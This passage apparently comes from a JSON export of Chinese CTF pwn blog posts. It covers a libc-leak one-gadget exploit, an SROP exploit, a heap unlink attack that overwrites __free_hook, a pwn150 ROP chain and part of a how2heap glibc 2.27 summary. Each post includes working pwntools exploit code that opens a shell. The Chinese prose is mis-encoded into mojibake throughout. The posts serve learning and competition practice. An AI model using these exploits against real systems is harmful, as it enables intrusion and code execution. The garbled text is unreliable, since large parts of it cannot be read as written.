ä¸€ä¸ªå‡½æ•°ï¼Œç„¶åè°ƒç”¨ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457785.png)\n\n2.ç„¶åç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ä¼šæ³„éœ²å‡ºlibcåœ°å€å’Œï¼Œç›´æ¥ä»ç½‘ç«™https://libc.blukat.me/æ¥æ‰¾ç‰ˆæœ¬ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–å·¥å…·ä¹Ÿå¯ä»¥ï¼Œåˆ©ç”¨æ³„éœ²å‡ºæ¥çš„abså‡½æ•°åœ°å€ï¼Œå³å¯å¾—çŸ¥libcç‰ˆæœ¬ä¸ºlibc6_2.23-0ubuntu11.2_amd64ã€‚\n\n3.ç„¶åæ ¹æ®ç¨‹åºï¼Œå³å¯æ„é€ system(\"/bin/sh\")ï¼Œæˆ–è€…åˆ©ç”¨onegadgetä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œç›´æ¥è´´expå§ã€‚\n\n```\n#!/usr/bin/python\n#coding:utf-8\n\nfrom pwn import *\nio = remote('pwn.utctf.live',5433)\n#io = process('./functionalprogramming')\nonegadget = 0xf0364\n\nio.sendline('1')\nio.sendline('1')\nio.recvuntil(\"Abs: \")\nlibc_abs = int(io.recv()[2:14],16)\nlibc_base = libc_abs-0x3a640\nlog.info('libc_abs:%x'%libc_abs)\nlog.info('libc_base:%x'%libc_base)\nio.sendline('1')\n\n#io.sendline('1')\npayload = \"\"\npayload += hex(libc_base+onegadget)\npayload = payload.replace('0x','')\n\nio.send(payload)\nio.interactive()\n```\n\n \n\nä¸‰ã€Smolå¤ç°ï¼š\n\n1.æ²¡å•¥å¥½åˆ†æçš„ï¼Œæ ˆæº¢å‡ºæ¼æ´ï¼Œä»€ä¹ˆä¿æŠ¤éƒ½æ²¡å¼€ï¼Œå­˜åœ¨BSSæ®µï¼Œå¸¸è§„SROPï¼Œåˆ©ç”¨æ ˆåŠ«æŒåˆ°BSSæ®µï¼Œæ‡‚çš„éƒ½æ‡‚ã€‚\n\n2.ç›´æ¥è´´exp:\n\n```\n#!/usr/bin/python\n#coding:utf-8\n\nfrom pwn import *\ncontext.update(os = 'linux', arch = 'amd64')\nio = remote(\"pwn.utctf.live\",9998)\n\npayload = \"\"\npayload += p64(0x402000+0x10)\npayload += p64(0x402000+0x10) #addr 0x402008\npayload += p64(0x401015) #rsp = 0x402020\nio.send(payload)\n\nframe_execve = SigreturnFrame() #è®¾ç½®execveçš„SROPå¸§ï¼Œæ³¨æ„è®¡ç®—/bin/sh\\x00æ‰€åœ¨åœ°å€\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = 0x402008\nframe_execve.rip = 0x40103D #syscall_addr\n\npayload2 = \"\"\npayload2 += \"/bin/sh\\x00\"        #0x402008\npayload2 += p64(0x402000+0x10)   #0x402010\npayload2 += p64(0x401015)        #0x402018\npayload2 += p64(0x402000+0x30)   #0x402020\npayload2 += \"A\"*0x10             #0x402028\npayload2 += p64(0x40103D)\npayload2 += str(frame_execve)    #0x402038\nio.send(payload2)\n\n#buf = 0x402008\n#rsp = 0x402020\n#rbp = 0x402010 ->0x402010\n\npayload3 = payload2[0:8]\npayload3 += \"\\x30\\x20\\x40\\x00\\x00\\x00\\x00\"\nio.send(payload3)\n\nio.interactive()\n```\n\nä½†æ˜¯è¿™é‡Œè°ƒè¯•äº†å¥½ä¸€æ®µæ—¶é—´ï¼Œéœ€è¦å†ä»”ç»†åˆ†æä¸€ç‚¹ï¼Œä¸‹å›äº‰å–æ—©ç‚¹è§£å†³ç±»ä¼¼çš„é¢˜ç›®ã€‚\n\n \n\n \n","tags":["æ¯”èµ›"],"categories":["PWN"]},{"title":"axb_2019_heap-unlink","url":"/2021/08/14/axb_2019_heap-unlink/","content":"\n1.æœ€å¼€å§‹çœ‹æºç ï¼Œæ„Ÿè§‰è¿˜è¡Œï¼Œèƒ½çœ‹æ‡‚ï¼Œä½†æ˜¯ä¸€æ—¦çœ‹å…¶ä»–äººè®²unlinkï¼Œæ„Ÿè§‰å®Œå…¨å¯¹ä¸ä¸Šï¼Œåˆ†æ˜å°±æ˜¯çæï¼Œä¹‹åè°ƒè¯•æ‰å‘ç°å•ç‹¬çš„unlinkæ”»å‡»å¹¶ä¸æ˜¯é’ˆå¯¹chunkçš„ï¼Œè€Œæ˜¯é’ˆå¯¹å…·ä½“é¢˜ç›®çš„ç»“æ„ä½“çš„ã€‚å¹¶ä¸”è¦æ±‚ç¨‹åºå¯ä»¥ä¿®æ”¹æ‰chunkçš„sizeä½ï¼Œæ‰§è¡Œå‘ä¸Šåˆå¹¶ä»è€Œè§¦å‘unlinkã€‚\n\n2.unlinkæ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š\n\n(1)æ‰¾åˆ°é¢˜ç›®ä¸­çš„chunklistä½ç½®ï¼Œå¹¶åˆ†æ¸…ç»“æ„ä½“ä¸­æ˜¯sizeåœ¨å‰è¿˜æ˜¯chunkåœ¨å‰ã€‚\n\n(2)è¿™é‡Œå‡è®¾æˆ‘ä»¬æƒ³è¦æ§åˆ¶chunklist[0]ä¸­çš„chunkã€‚ç”³è¯·chunk0,chunk1,chunk2ã€‚åœ¨chunk0ä¸­æ„é€ fakechunkï¼Œå¹¶è®¾ç½®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfakechunk->fd = chunklist_addr-0x18\nfakechunk->bk = chunklist_addr-0x10\n```\n\n(3)é€šè¿‡å †æº¢å‡ºæˆ–è€…off-by-oneå°†chunk1çš„pre_sizeè®¾ç½®æˆfakechunk_sizeï¼Œå°†chunk1çš„sizeè®¾ç½®æˆfakechunk_size+chunk1_sizeã€‚\n\n(4)freeæ‰chunk1ï¼Œè¿™æ ·å°±ä¼šè§¦å‘å‘ä¸Šåˆå¹¶ï¼Œå°†fakechunkå’Œchunk1åˆå¹¶ã€‚åŒæ—¶ï¼Œç”±äºåˆå¹¶è¿‡ç¨‹ä¸­è°ƒç”¨äº†unlinkå‡½æ•°ï¼Œé‚£ä¹ˆchunklist[0].chunkå°±ä¼šæŒ‡å‘chunlist_addr-0x18ï¼Œå¯¹åº”çš„å°±æ˜¯æˆ‘ä»¬çš„chunk0æŒ‡å‘chunklist_addr-0x18ã€‚\n\nâ–²unlinkæºç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nFD = P->fd;\nBK = P->bk;\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))\nmalloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\nFD->bk = BK;\nBK->fd = FD;\n```\n\nA.é¦–å…ˆé€šè¿‡fakechunkï¼Œä¹Ÿå°±æ˜¯pï¼Œæ‰¾åˆ°å‰ä¸€ä¸ªchunkå’Œåä¸€ä¸ªchunk:\n\n```\n#æ³¨é‡Šå¤´\n\nFD = P->fd;\nBK = P->bk;\n```\n\nè¿™é‡Œçš„FDå’ŒBKåˆ†åˆ«ä¸ºfakechunkçš„å‰ä¸€ä¸ªchunkå’Œåä¸€ä¸ªchunkï¼Œä¹Ÿå°±æ˜¯chunklist_addr-0x18å’Œchunklist_addr-0x10ã€‚\n\nB.ç„¶åè¿‡æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\n```\n\nèƒ½è¿‡æ£€æŸ¥çš„åŸå› å°±æ˜¯å› ä¸ºFD->bkå°±ç›¸å½“äºæ˜¯[chunklist_addr-0x18]+[0x18]ï¼Œå°±ç›¸å½“äºchunklist_addrï¼Œä¹Ÿå°±æ˜¯chunklist[0].chunkã€‚è€Œè¯¥åœ°å€ä¸­ä¿å­˜çš„å†…å®¹å°±æ˜¯fakechunk_addrã€‚\n\næ³¨æ„chunk0_addrå’Œfakechunk_addrä¸æ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºæœ‰chunkç»“æ„çš„åŸå› ï¼Œå¦‚ä¸‹å›¾ï¼Œå¯ä»¥çœ‹åˆ°å®é™…ä¸Šchunklist[n].chunkä¿å­˜çš„å€¼æ˜¯chunkæ•°æ®éƒ¨åˆ†çš„åœ°å€ï¼Œåœ¨è¿™é‡Œä¹Ÿå°±ç›¸å½“äºæ˜¯fakechunk_addrã€‚æ‰€ä»¥ä¹Ÿå°±èƒ½è¿‡æ£€æŸ¥ã€‚åŒç†BK->fdç›¸å½“äºæ˜¯[chunklist_addr-0x10]+[0x10]ï¼Œç­‰äºchunklist_addrï¼Œè¯¥åœ°å€ä¸­ä¿å­˜çš„å€¼å°±æ˜¯fakechunk_addrã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191533541.jpeg)\n\nC.è¿‡å®Œæ£€æŸ¥ä¹‹åï¼Œå°±æ¥åˆ°èµ‹å€¼éƒ¨åˆ†\n\n```\n#æ³¨é‡Šå¤´\n\nFD->bk = BK;\nBK->fd = FD;\n```\n\né‚£ä¹ˆç°åœ¨FD->bk = BKç›¸å½“äº[chunklist_addr-0x18]+[0x18]ï¼Œä¹Ÿå°±æ˜¯chunklist_addrä¸­çš„å€¼è¢«èµ‹å€¼ä¸ºchunklist_addr-0x10ï¼Œä¹‹åBK->fd = FDï¼Œå°±æ˜¯chunklist_addrä¸­çš„å€¼è¢«èµ‹å€¼ä¸ºchunklist_addr-0x18ï¼Œæ‰€ä»¥æ€»çš„æ¥è¯´ï¼Œchunklist[0].chunkä¼šæŒ‡å‘chunklist_addr-0x18ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„fakechunkæŒ‡å‘chunklist_addr-0x18ï¼Œè¿™æ ·å°±ç›¸å½“äºå¯ä»¥é€šè¿‡ä¿®æ”¹fakechunkå°±å¯ä»¥ä¿®æ”¹chunklistè¿™ä¸ªbssæ®µä¸Šçš„å†…å®¹ã€‚è€Œfakechunkåˆæ˜¯chunk0çš„æ•°æ®éƒ¨åˆ†ï¼Œå®Œå…¨åœ¨æˆ‘ä»¬çš„æŒæ§èŒƒå›´ã€‚\n\n(5)ç°åœ¨ä¿®æ”¹chunk0æ•°æ®å°±å…ˆå½“äºä¿®æ”¹chunklistè¿™ä¸ªbssæ®µä¸Šçš„å†…å®¹ã€‚\n\n3.åœ¨è¿™é“é¢˜ä¸­ï¼ŒåŸæœ¬chunklist[0].chunkä¸­ä¿å­˜çš„å€¼æ˜¯fakechunk_addrï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹chunklist[0].chunkä¸­ä¿å­˜çš„å€¼ä¸ºfree_hookåœ°å€ï¼Œé‚£ä¹ˆä¹‹åå†ä¿®æ”¹chunk0æ•°æ®éƒ¨åˆ†å°±ç›¸å½“äºä¿®æ”¹free_hookä¸­çš„å†…å®¹äº†ã€‚é‚£ä¹ˆç°åœ¨å°±å¯ä»¥å°†free_hookä¿å­˜çš„å€¼ä¿®æ”¹ä¸ºsystemçš„çœŸå®åœ°å€ï¼Œè¿™æ ·åœ¨freeæ—¶å°±ç›¸å½“äºè°ƒç”¨systemå‡½æ•°ï¼Œé‚£ä¹ˆä¸€æ—¦freeæŸä¸ªchunkï¼Œè€Œè¯¥chunkçš„æ•°æ®éƒ¨åˆ†ä¸ºbinshå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºè°ƒç”¨system(\"/bin/sh\")ï¼Œä»è€Œgetshell.\n\n4.ç°åœ¨å¼€å§‹åˆ†æè¿™é“é¢˜ç›®ï¼Œget_inputå‡½æ•°ä¸­å­˜åœ¨off-by-oneï¼Œbanner()å‡½æ•°ä¸­å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š\n\nget_input:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191533283.jpeg)\n\nbanner:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191533339.jpeg)\n\nåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦æ¼æ´æ³„éœ²Libcä»è€Œå¾—åˆ°å…¶å®ƒæ‰€æœ‰åœ°å€ã€‚ä¹‹åé€šè¿‡off-by-oneè¿›è¡Œunlinkæ”»å‡»ï¼Œæ„é€ fakechunkåˆ°chunklistè¿™ä¸ªBssæ®µä¸Šï¼Œä¿®æ”¹chunklistæ®µä¸Šçš„chunklist[0].chunkï¼Œä½¿å…¶æŒ‡å‘free_hook_addrã€‚ä¹‹åå†é€šè¿‡ä¿®æ”¹chunk0ä»è€Œä¿®æ”¹free_hookä¸ºsystemçœŸå®åœ°å€ï¼Œå†ç”³è¯·æŸä¸ªæ•°æ®éƒ¨åˆ†ä¸ºbinshå­—ç¬¦ä¸²çš„chunkï¼Œé‡Šæ”¾æ‰å°±èƒ½getshellã€‚\n\næ€»expå¦‚ä¸‹ï¼š\n\n(1)é¦–å…ˆå¢åˆ æ”¹æŸ¥å‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef add(index,size,content):\n    p.sendlineafter('>> ','1')\n    p.sendlineafter('Enter the index you want to create (0-10):',str(index))\n    p.sendlineafter('Enter a size:',str(size))\n    p.sendlineafter('Enter the content:',content)\n\ndef free(index):\n    p.sendlineafter('>> ','2')\n    p.sendlineafter('Enter an index:',str(index))\n\ndef edit(index,content):\n    p.sendlineafter('>> ','4')\n    p.sendlineafter('Enter an index:',str(index))\n    p.sendafter('Enter the content:',content)\n```\n\n(2)åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦æ¼æ´æ³„éœ²æ ˆä¸Šçš„__libc_mainå’Œmainåœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\np.sendline('%11$p%15$p')\np.recvuntil('Hello,')\nbase = hex(int(p.recv(14),16)-0x116a - 28)\nlibcbase = hex(int(p.recv(14),16) - 240 - libc.sym['__libc_start_main'])\nchunklist = hex(base + 0x202060)\nfree_hook = libcbase + libc.sym['__free_hook']\nsystem = libcbase + libc.sym['system']\n```\n\n(3)åˆ©ç”¨off-by-oneå‘ä¸Šåˆå¹¶chunk0å’Œchunk1ï¼Œæ‰§è¡Œunlinkæ”»å‡»ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nadd(0,0x98,'aaaa')#0\nadd(1,0x98,'bbbb')#1\nadd(2,0x90,'cccc')#2\nadd(3,0x90,'/bin/sh\\x00')#3\n\npayload=p64(0)+p64(0x91)+p64(chunklist-0x18)+p64(chunklist-0x10)+p64(0)*14+p64(0x90)+'\\xa0'\nedit(0,payload)\ndelete(1)\n```\n\n(4)ä¿®æ”¹chunklist[0].chunkæŒ‡å‘free_hookï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nedit(0,p64(0)*3+p64(free_hook)+p64(0x10))\n#ç”±äºunlinkæ”»å‡»èµ‹å€¼ä¹‹åï¼Œchunk0æ•°æ®éƒ¨åˆ†æŒ‡å‘äº†chunklist_addr-0x18ä½ç½®ï¼Œæ‰€ä»¥éœ€è¦å¡«å……p64(0)*3\n```\n\n(5)ä¿®æ”¹free_hookä¸ºsystemï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nedit(0,p64(system))\n```\n\n(6)åˆ©ç”¨freeè§¦å‘systemï¼Œgetshell\n\n```\n#æ³¨é‡Šå¤´\n\nfree(3)\np.interactive()\n```\n\n \n\n \n\n \n\n \n","tags":["unlink"],"categories":["PWN","pwnå †-unlink"]},{"title":"bugs bunny ctf 2017-pwn150","url":"/2021/08/14/bugs bunny ctf 2017-pwn150/","content":"\n \n\n1.å¸¸è§„checksecï¼Œå¯ä»¥å‘ç°NX enabledï¼Œå¹¶ä¸”æ²¡æœ‰RAXå­—æ®µã€‚æ‰“å¼€IDAåå¯ä»¥çœ‹åˆ°åœ¨helloå‡½æ•°ä¸­å­˜åœ¨æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchar s; // [rsp+0h] [rbp-50h]\n---------------------------------------------------------------\nfgets(&s, 192, stdin);\n```\n\nç„¶ååˆ†æç¨‹åºï¼Œæ±‡ç¼–ä»£ç ä»€ä¹ˆçš„ï¼Œæ²¡æ‰¾åˆ°æœ‰call eaxä¹‹ç±»çš„æ“ä½œï¼Œè¿™é‡Œå°±é€‰æ‹©ROPæ¥getshellã€‚\n\n2.ç”±äºæ˜¯64ä½ç¨‹åºï¼Œä¼ å‚æ–¹å¼ä¸åŒï¼Œä¾æ¬¡ä¸ºï¼šrdi, rsi, rdx, rcx, r8, r9, æ ˆï¼Œè€Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è·³è½¬systemå‡½æ•°ï¼Œè®©systemå‡½æ•°è¯»å–binshå­—ç¬¦ä¸²ï¼Œsystemå‡½æ•°åˆåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªå‚æ•°å¿…ç„¶éœ€è¦åœ¨rdiä¸­è¯»å–ã€‚æˆ‘ä»¬çš„è¾“å…¥æ˜¯ä½äºæ ˆä¸Šï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªpop rdi;å’Œretçš„æ“ä½œå‘½ä»¤ï¼Œè®©æˆ‘ä»¬çš„è¾“å…¥èµ‹å€¼ç»™rdiå¯„å­˜å™¨ã€‚\n\n3.åœ¨å“ªæ‰¾pop rdi; ret;ä¹Ÿæ˜¯ä¸ªé—®é¢˜ï¼Œè¿™é‡Œæœ‰ä¸ªå·¥å…·å¯ä»¥å®ç°ROPgadget ï¼Œåœ¨linuxä¸‹å¯ä»¥è¾“å…¥ï¼šä»¥ä¸‹ä»£ç æ¥è·å–ä»£ç åœ°å€ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nROPgadget --binary pwn150 | grep \"pop rdi\"\n```\n\n4.ç„¶åéœ€è¦systemå‡½æ•°çš„åœ°å€ï¼Œè¿™é‡Œtodayå‡½æ•°ç›´æ¥calläº†è¯¥å‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨IDAåœ¨æ±‡ç¼–ä¸­çœ‹åˆ°è¯¥åœ°å€(è¡Œçš„å‰ç¼€)ã€‚æˆ–è€…å…ˆctrl + sï¼Œåœ¨got.pltä¸­æœç´¢ä¸€ä¸‹ï¼Œå‘ç°ä¹Ÿèƒ½æ‰¾åˆ°systemå‡½æ•°ã€‚æ‰€ä»¥è¿™é‡Œè·å–systemåœ°å€æˆ‘ä»¬å¯ä»¥æœ‰ä¸¤ç§æ–¹æ³•ï¼š\n\nâ‘ pop rdiä¹‹åï¼Œè®©retæŒ‡å‘todayå‡½æ•°ä¸­çš„call_system_åœ°å€ï¼š0x40075F\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191553103.jpeg)\n\nâ‘¡pop rdiä¹‹åï¼Œè®©retæŒ‡å‘ä»elf = ELF('./pwn150')å’Œsystem_addr = p64(elf.symbols['system'])ä¸­æ‰¾åˆ°çš„åœ°å€system_addrï¼Œä¹Ÿå°±æ˜¯pltè¡¨ä¸­çš„åœ°å€(è¿™é‡Œå…¶å®å¯ä»¥ç›´æ¥åœ¨IDAä¸­æ‰¾åˆ°)\n\n(ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™æ˜¯64ä½ç¨‹åºï¼Œsystemå‡½æ•°ä»rdiä¸Šå–å€¼ï¼Œä¸æ ˆæ— å…³ç³»ï¼Œæ‰€ä»¥callå’Œç›´æ¥è·³è½¬pltå·®ä¸å¤šï¼Œä½†æ˜¯å¦‚æœæ˜¯32ä½ç¨‹åºï¼Œé‚£ä¹ˆå¸ƒç½®æ ˆçš„æ—¶å€™å°±éœ€è¦è€ƒè™‘åˆ°pltè¡¨å’Œç›´æ¥call systemå‡½æ•°çš„ä¸åŒäº†ã€‚å¦‚æœæ˜¯ç›´æ¥è·³è½¬pltè¡¨ä¸­çš„åœ°å€ï¼Œé‚£ä¹ˆæ ˆçš„å¸ƒç½®é¡ºåºåº”è¯¥æ˜¯ï¼š\n\n**systemå‡½æ•°-systemå‡½æ•°çš„è¿”å›åœ°å€-sytemå‡½æ•°çš„å‚æ•°ã€‚**\n\nä½†å¦‚æœæ˜¯è·³è½¬call systemï¼Œé‚£ä¹ˆç”±äºcallæŒ‡ä»¤ä¼šè‡ªåŠ¨pushè¿›eipï¼Œåˆ™æ ˆå¸ƒç½®åº”è¯¥ä¸ºï¼š\n\n**call systemå‡½æ•°åœ°å€-systemå‡½æ•°å‚æ•°ã€‚**\n\nä¸¤è€…ä¸å¤ªä¸€æ ·ï¼Œéœ€è¦åŠ ä»¥åŒºåˆ†ã€‚åé¢ä¼šæœ‰gotè¡¨å’Œpltçš„è¯¦ç»†è®²è§£)\n\n4.æ¥ä¸‹æ¥å¯»æ‰¾binshå­—ç¬¦ä¸²ï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°ï¼Œåªæœ‰shï¼Œä¹Ÿå¯ä»¥å¼€shellã€‚shift+F12è¿›å…¥å­—ç¬¦ä¸²åå³é”®åœ¨åå…­è¿›åˆ¶ä¸­åŒæ­¥ï¼Œä¹‹åå¯ä»¥å¯¹åº”çœ‹åˆ°shçš„å­—ç¬¦åœ°å€ï¼Œç”±äºshä¹‹åç›´æ¥å°±æ˜¯ç»“æŸå­—ç¬¦00ï¼Œä¸ä¼šå¾€åå¤šè¯»ï¼Œè€Œåªä¼šè¯»å–shï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å°†è¯¥å­—ç¬¦ä¸²çš„åœ°å€å†™åœ¨pop rdiåœ°å€åé¢ï¼Œç›´æ¥èµ‹å€¼ç»™rdiï¼Œå†™è¿›å»ã€‚\n\n5.ç¼–å†™payloadï¼Œé¡ºåºä¸ºï¼špayload = padding + pop_rdi_addr + bin_sh_addr + system_addrï¼ˆæˆ–è€…æ˜¯call_system_addrï¼‰ã€‚\n\n \n\nâ–²ç”±äº64ä½ç¨‹åºä¸­é€šå¸¸å‚æ•°ä»å·¦åˆ°å³ä¾æ¬¡æ”¾åœ¨rdi, rsi, rdx, rcx, r8, r9ï¼Œå¤šå‡ºæ¥çš„å‚æ•°æ‰ä¼šå…¥æ ˆï¼ˆæ ¹æ®è°ƒç”¨çº¦å®šçš„æ–¹å¼å¯èƒ½æœ‰ä¸åŒï¼Œé€šå¸¸æ˜¯è¿™æ ·ï¼‰ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªç»™RDIèµ‹å€¼çš„åŠæ³•ã€‚ä¹Ÿå°±æ˜¯ROPgadget --pwn150 | grep â€œpop rdiâ€è¿™æ®µä»£ç è·å–ã€‚æ‰€ä»¥è¿›å…¥systemä¸­ç”¨callå’Œreturnç›´æ¥è¿›éƒ½è¡Œï¼Œå‚æ•°æ˜¯ä»rdiä¸­è·å–çš„ï¼Œè¿›å»ä¹‹åæ ˆä¸Šçš„è¿”å›åœ°å€æ˜¯å•¥éƒ½æ²¡å…³ç³»ï¼Œå› ä¸ºå·²ç»getshellï¼Œç”¨ä¸åˆ°ã€‚\n\nâ–²æ‰§è¡Œcall func_addræŒ‡ä»¤ç›¸å½“äºpush eip ;jmp func_addrï¼Œè€Œæ‰§è¡Œpltè¡¨ä¸­åœ°å€åˆ™ç›¸å½“äºåªæœ‰jmp func_addrï¼Œæ²¡æœ‰å‰é¢çš„push eipï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨è®¾ç½®è¿™ä¸ªeipï¼Œè€Œcallåˆ™ä¸ç”¨ã€‚æ³¨æ„è¿™æ˜¯32ä½ç¨‹åºä¸‹ï¼Œ64ä½ç¨‹åºä¸‹åˆ™æŒ‰ç…§æœ¬ç¯‡æ‰€è¯´ï¼Œç›´æ¥pop rdiå³å¯ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"how2heap_libc2.27_summary","url":"/2021/08/14/how2heap_libc2.27_summary/","content":"\n\\1. fastbin_dup:\nå¡«æ»¡Tcacheåfree(a),free(b),free(a)ä¹‹åå³å¯ã€‚\n\n\\2. fastbin_reverse_into_tcache:\n(1)ç”³è¯·14ä¸ªchunkï¼Œéƒ½é‡Šæ”¾æ‰0-6è¿›å…¥tcacheï¼Œ7-13è¿›å…¥fastbinä¸­ã€‚(è¿™14ä¸ªchunkå¤§å°éœ€ç›¸ç­‰)\n(2)æ­¤æ—¶mallcoæ‰7ä¸ªchunkï¼Œå°±å¯ä»¥å°†tcacheä¸­çš„7ä¸ªchunkéƒ½ç”³è¯·å‡ºæ¥ã€‚\n(3)å†åˆ©ç”¨æ¼æ´ä¿®æ”¹chunk7çš„fdä¸ºæ ˆä¸Šçš„åœ°å€(ä»»æ„åœ°å€)ï¼Œè¿™æ—¶å†mallocä¸€æ¬¡ï¼Œå°±ä¼šä»fastbinä¸­ç”³è¯·chunkï¼Œç”±äºfastbinå…ˆè¿›åå‡ºçš„å…³ç³»ï¼Œä¼šå°†chunk13ç”³è¯·å‡ºæ¥ã€‚åŒæ—¶ç”±äºtcacheæœºåˆ¶ï¼Œå½“fastbinä¸­å¯¹åº”å¤§å°çš„binä¸­è¿˜å­˜åœ¨chunkï¼Œå°±ä¼šå°†è¿™äº›Chunkéƒ½æ‹¿å‡ºæ¥æ”¾è¿›å¯¹åº”å¤§å°çš„tcacheä¸­ã€‚\n(4)ç”±äºå…ˆè¿›åå‡ºçš„å…³ç³»ä¸å˜ï¼Œæ‹¿å‡ºé¡ºåºä¸ºchunk12,chunk11â€¦chunk7ã€‚è¿›å…¥tcacheåçš„é¡ºåºä¸ºchunk7,chunk8â€¦.chunk12ã€‚\n(5)è¿™æ ·åˆç”±äºchunk7çš„fdè¢«æˆ‘ä»¬æ”¹æ‰äº†ï¼Œæ‰€ä»¥å®é™…çš„é¡ºåºä¸ºchunk7->chunk7.fd->chunk8â€¦\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449078.png)\n(6)åŒæ—¶é‡Šæ”¾å¯ä»¥å‘æ ˆä¸Šå†™å…¥å †åœ°å€ï¼Œä¹‹åå†è¿ç»­ç”³è¯·å°±å¯ä»¥å°†ä»æ ˆä¸Šç”³è¯·chunkã€‚\n\n\\3. house_of_botcake(åªèƒ½åœ¨double freeå‰æä¸‹ä½¿ç”¨)ï¼š\n(1)ç”³è¯·chunk0-chunk6ç”¨äºå¡«å……tcacheï¼Œç„¶åç”³è¯·chunk7,chunk8,chunk9ï¼Œå…¶ä¸­chunk9ç”¨äºé˜²æ­¢å’Œtopchunkåˆå¹¶\n(2)é‡Šæ”¾chunk0-chunk6å¡«å……tcacheï¼Œé‡Šæ”¾chunk7ï¼Œchunk8ï¼Œå‘ç”Ÿåˆå¹¶è¿›å…¥unsortedbinä¸­ï¼Œç§°ä¸ºchunk_Uã€‚\n(3)mallocä¸€æ¬¡ï¼Œå°†chunk6ä»tcacheä¸­ç”³è¯·å‡ºæ¥ï¼Œç„¶åå†é‡Šæ”¾chunk8(double free)ï¼Œè¿™æ ·chunk8å°±ä¼šè¿›å…¥tcacheä¸­ã€‚ç°åœ¨chunk8å°±ä¼šæ—¢åœ¨tcacheä¸­ï¼Œåˆè¢«åŒ…å«åœ¨unsortedbinçš„chunk_Cä¸­ã€‚\n(4)å†ç”³è¯·ä¸€æ¬¡å¤§å°å¤§äºä»¥ä¸Šchunk_sizeçš„chunk_Cï¼Œè¿™ä¸ªchunk_Cå°±ä¼šå°†chunk_Uåˆ‡å‰²ï¼ŒåŒæ—¶ä½¿å¾—chunk_CåŒ…å«chunk8ï¼Œè¿™æ ·å°±å¯ä»¥ä»chunk_Cä¿®æ”¹chunk8çš„fdæŒ‡é’ˆã€‚\n(5)ç”±äºchunk8åŒæ—¶è¿˜åœ¨tcacheä¸­ï¼Œé‚£ä¹ˆå†è¿ç»­ä¸¤æ¬¡chunk8å¤§å°çš„sizeå°±å¯ä»¥å°†chunk8å’Œchunk8.fdç”³è¯·å‡ºæ¥ï¼Œå®ç°ä»»æ„åœ°å€ç”³è¯·å †å—ã€‚\n\n\\4. house_of_einherjar(éœ€è¦æ³„éœ²å †åœ°å€)ï¼š\n(1)ç”³è¯·3ä¸ªchunkï¼Œchunka,chunkb,chunkcï¼Œcçš„çœŸå®sizeå¤§äº0x100ï¼›\n(2)ç„¶åé€šè¿‡chunkbçš„å †æº¢å‡º(off by one/null)ï¼Œä¿®æ”¹chunkcçš„in_useä½ä¸º0ï¼Œå¹¶ä¸”åœ¨chunkcçš„prev_sizeå¤„ä¼ªé€ fake_prev_size=chunkb+chunka-0x10ï¼›\n(3)åœ¨chunkaä¸­ä¼ªé€ chunkï¼Œæ»¡è¶³è¦æ±‚ï¼š\n&Fake_chunk = chunka+0x10\nFake_chunk->size = sizeof(chunka) -0x10+sizeof(chunkb)\nFake_chunk->fd = Fake_chunk\nFake_chunk->bk = Fake_chunk\nç”¨ä»¥ç»•è¿‡unlinkçš„æ£€æŸ¥ã€‚\n(4)éšåç”³è¯·7ä¸ªä¸chunkcåŒå¤§å°çš„chunkï¼Œé‡Šæ”¾å¡«å……tcacheï¼›\n(5)é‡Šæ”¾chunkcï¼Œå› ä¸ºchunkcçš„prev_inuseä½è¢«ç½®ä¸º0ï¼Œæ‰€ä»¥ä¼šå‘ä¸Šåˆå¹¶ï¼Œé€šè¿‡fake_prev_sizeæ‰¾åˆ°å‰ä¸€ä¸ªå 